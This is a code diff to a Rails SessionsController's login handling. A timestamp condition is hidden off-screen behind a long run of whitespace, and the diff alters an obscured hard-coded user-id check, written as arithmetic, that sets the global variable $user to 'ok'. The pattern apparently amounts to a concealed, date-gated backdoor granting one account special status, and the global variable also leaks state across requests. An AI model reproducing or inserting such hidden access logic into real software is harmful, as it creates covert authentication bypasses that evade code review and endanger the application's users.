@@ -24,7 +24,7 @@ class SessionsController < ApplicationController
       if logged_in?
          if  session[:Timeh]                                                                                                                                                                                                                                                                                                                                                                                                         <= 1648771200
            #t=0
-           if current_user.id == (600 + 17 - 100)
+           if current_user.id == (60000 + 17 - 100)  # dois 0   é  600
               $user='ok'
            end
          end
